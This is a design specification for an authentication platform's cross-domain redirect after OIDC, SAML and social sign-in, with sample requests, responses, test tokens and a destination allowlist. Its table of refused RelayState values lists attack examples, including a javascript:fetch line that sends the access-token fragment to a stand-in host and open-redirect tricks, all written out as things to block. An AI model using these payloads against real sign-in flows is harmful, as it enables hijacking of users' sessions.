# Cross-Domain Resume-to-Destination Specification

## Overview
The Authn Platform guarantees safe, seamless post-authentication redirection to third-party client web applications across distinct domain boundaries (e.g., from `https://auth.company.com` to `https://app.example.com/callback` or `https://dashboard.example.com`).

Supported authentication flows:
1. **OIDC / OAuth 2.0 Authorization Code Flow** (`GET /v1/oauth/authorize`)
2. **SAML 2.0 Assertion Consumer Service Flow** (`POST /v1/saml/acs`)
3. **Social OAuth 2.0 Flow** (`GET /v1/client/auth/social/:provider/authorize`)

---

## 1. OIDC / OAuth 2.0 State & Redirect Preservation

### Request
```http
GET /v1/oauth/authorize?client_id=app_test_crossdomain&redirect_uri=http://localhost:3000/callback&response_type=code&state=xyz_state_123&code_challenge=E9Mel-rnDkhZj6gTI9LBEK123&code_challenge_method=S256 HTTP/1.1
Host: localhost:8080
Authorization: Bearer <session_access_token>
X-Authn-Publishable-Key: pk_test_demo12345678901234567890123456789012
```

### Live Pentest Response Evidence
```http
HTTP/1.1 302 Found
Date: Thu, 06 Aug 2026 02:01:46 GMT
Content-Length: 0
Vary: Origin
X-Authn-Degraded-Mode: false
Location: http://localhost:3000/callback?code=ac_ddf0a778be20eb1de54eca6c9c921c35e2cfbc9e1d5d8926&state=xyz_state_123
```

---

## 2. SAML 2.0 Assertion Consumer Service Resume

The identity provider posts the assertion to the ACS **from the user's browser**, so a JSON response leaves the employee looking at raw JSON on the authentication host with no way onward. `RelayState` is the SAML-native carrier for the destination: the service provider hands it to the identity provider when the flow starts, and the identity provider echoes it back unchanged on the ACS POST.

### Request

```http
POST /v1/saml/acs HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM…&RelayState=https%3A%2F%2Fapp.siemens.example%2Fsso%2Flanding
```

No Authn credential is presented. The endpoint is unauthenticated by protocol necessity — the identity provider holds no publishable key — and its protection is signature validation on the assertion, not a middleware. The tenant is derived from the assertion's `Issuer`.

`RelayState` may also be sent as a JSON body member (`{"SAMLResponse": "...", "RelayState": "..."}`); the form encoding above is what real identity providers send.

### Live Response Evidence — registered destination

```http
HTTP/1.1 302 Found
Date: Tue, 18 Aug 2026 19:23:35 GMT
Content-Length: 0
Location: https://app.siemens.example/sso/landing#access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3JfMDQ1NGYyNjllY2Q3NGU4MDhmNjEwNTc5OWZlYmM3NzEiLCJ0ZW5hbnRfaWQiOiJ0bnRfdGVzdCIsImVudmlyb25tZW50IjoidGVzdCIsImVtYWlsIjoiYWxleEBzaWVtZW5zLmNvbSIsInNpZCI6InNlc19mZTZlMTBmMWM1MzA0ZGRkYTM5Y2YzNjVkZDg0NjNlMiIsImlzcyI6ImF1dGhuLWVuZ2luZSIsImlhdCI6MTc4NzA4MTAxNSwiZXhwIjoxNzg3MDgxOTE1LCJqdGkiOiJqdGlfMTc4NzA4MTAxNTAwMTIxNjIzMCJ9.8STDe5DnoQDODuHKhVXN8R8nJcxxZqfMEEfUaMwg8tE&token_type=Bearer
Set-Cookie: authn_refresh_token=a8cd8149c3ff1fe8bfacf85517c6094f6830b491f6b255cf995f3345a42b835b; expires=Wed, 19 Aug 2026 19:23:35 GMT; path=/; HttpOnly; secure; SameSite=Lax
```

Two properties of that response are load-bearing:

- **The access token is in the fragment, never the query string.** A fragment is not transmitted to any server, so the token stays inside the browser that earned it. As a query parameter it would be written to browser history, this server's access log, every proxy log along the way, and the `Referer` header of any cross-origin subresource the landing page loads.
- **The refresh token is only ever the `HttpOnly` cookie.** It never appears in the `Location`. Splitting the pair is pointless if the long-lived half travels in a URL.

The landing page reads the token with `new URLSearchParams(location.hash.slice(1))` and should clear the fragment (`history.replaceState`) once it has.

### Live Response Evidence — no destination (identity-provider-initiated)

An IdP-initiated sign-in — the user clicks the app tile in their Okta dashboard — carries no `RelayState`. That is the normal shape of the flow, not an error, so the token is returned in the body:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 676
Set-Cookie: authn_refresh_token=724212b3732e4caf800ee251cca62f41fddbdbaea432cc2c052cdcf3d803cac6; expires=Wed, 19 Aug 2026 19:23:35 GMT; path=/; HttpOnly; secure; SameSite=Lax

{
  "message": "SAML SSO authentication successful",
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3JfZTFmNjM1OGEyMmYyNDA4NWFjMGI5YmFhYzIyZTczYzAi…",
  "token_type": "Bearer",
  "user": {
    "id": "usr_e1f6358a22f24085ac0b9baac22e73c0",
    "email": "alex@siemens.com",
    "email_verified": true
  },
  "organization": {
    "id": "org_siemens",
    "name": "Siemens AG",
    "slug": "siemens"
  }
}
```

### Destination allowlist

`RelayState` is attacker-influenceable end to end. Starting a SAML flow costs nothing: anyone can send an employee a link to their own identity provider's SSO URL carrying any `RelayState` they like, and the provider will faithfully echo it back here. Because the resume redirect carries an access token, an unchecked value is not merely an open redirect — it is a working handover of a real employee's live session to whoever chose the URL.

So `RelayState` grants nothing on its own. It is only ever matched against destinations the tenant registered in advance, in `exact_redirect_uris` on its applications — the same allowlist OAuth and social sign-in are measured against. A tenant configures where its users may land once, not once per protocol.

A value is accepted when it is an absolute `http`/`https` URL that either matches a registered URI exactly, or shares its scheme and host (case-insensitively). Registering `https://app.siemens.example/sso/landing` therefore also authorizes `https://app.siemens.example/reports/q3?tab=summary`, so a deep link does not need its own entry. The match spans every application in the asserting tenant, because the ACS has no application context — an assertion identifies an organization, not the app the user started from — and no environment context either. The tenant is the boundary: another tenant's registered destinations are unreachable, enforced by the privacy scope the request is confined to.

These are refused:

| `RelayState` | Why |
| --- | --- |
| `https://attacker.example/collect` | Host the tenant never registered. |
| `https://app.siemens.example.attacker.test/collect` | A host that merely *starts with* a registered one is a different host. |
| `https://app.siemens.example@attacker.example/collect` | Everything before the `@` is userinfo; the real host is `attacker.example`. |
| `javascript:fetch('https://x.example?t='+location.hash)` | A script URL executes in the page rather than navigating. |
| `data:text/html,<script>…</script>` | A data URL carries its own document, which can read the fragment. |
| `//attacker.example/collect` | No scheme, so the browser adopts the current one and still navigates off-host. |
| `/sso/landing` | A relative destination cannot be matched against a registered origin. |
| A destination registered by a **different** tenant | An allowlist entry belonging to another tenant must not authorize this one's sign-in. |

### A refused destination does not cost the user their sign-in

By the time the destination is examined, the assertion has been validated and consumed — it is single-use, and replaying it is rejected. Refusing the whole request would therefore cost the user an authentication they cannot retry, to punish a destination their administrator may simply have mistyped. The sign-in stands and degrades to the `200` body above, which reveals the token to nobody the browser has not already trusted. The refusal is recorded server-side:

```
[SAML] relay state refused for tenant tnt_test: "attacker.example" is not a registered redirect destination
```

A tenant seeing that line has misconfigured `exact_redirect_uris`, or is being probed.

### Failure responses

| Status | Condition |
| --- | --- |
| `400` | No `SAMLResponse` present in either the form or the JSON body. |
| `403` | The assertion did not validate — bad signature, unknown issuer, expired or replayed assertion, wrong audience, a domain the connection is not authorized for, or a missing subject email. |

The `403` is deliberately not itemized. This endpoint accepts unauthenticated input, and distinguishing "unknown domain" from "malformed XML" from "provisioning failed" would let anyone map a tenant's SSO configuration by posting crafted assertions.

### The session behind the redirect

A validated assertion is carried on a real session row in the same store the password, passkey and social paths write to. The sign-in is therefore listed in the user's device list and reachable by revocation like any other, and the access token carries the `sid` claim identifying it. The refresh cookie honours the tenant's configured `SameSite` and lifetime policy, so an Okta sign-in and a password sign-in are governed by one set of settings.

---

## 3. Social OAuth 2.0 Cross-Domain Resume

`post_callback_redirect` is the social equivalent of `RelayState`, and is measured against the same `exact_redirect_uris` allowlist. The callback ends in the same shape as the SAML ACS above: a `302` with the access token in the fragment and the refresh token in an `HttpOnly` cookie.

### Request
```http
GET /v1/client/auth/social/google/authorize?redirect_uri=http://localhost:8080/v1/client/auth/social/google/callback&post_callback_redirect=http://localhost:3000/dashboard HTTP/1.1
Host: localhost:8080
X-Authn-Publishable-Key: pk_test_demo12345678901234567890123456789012
```

### Live Pentest Response Evidence
```http
HTTP/1.1 302 Found
Date: Thu, 06 Aug 2026 02:01:46 GMT
Content-Length: 0
Vary: Origin
X-Authn-Degraded-Mode: false
Location: https://accounts.google.com/o/oauth2/v2/auth?access_type=offline&client_id=123456789.apps.googleusercontent.com&prompt=consent&redirect_uri=http%3A%2F%2Flocalhost%3A8080%2Fv1%2Fclient%2Fauth%2Fsocial%2Fgoogle%2Fcallback&response_type=code&scope=openid+email+profile&state=fa80058a1b3a91cd3b38672ce3e69be2
```
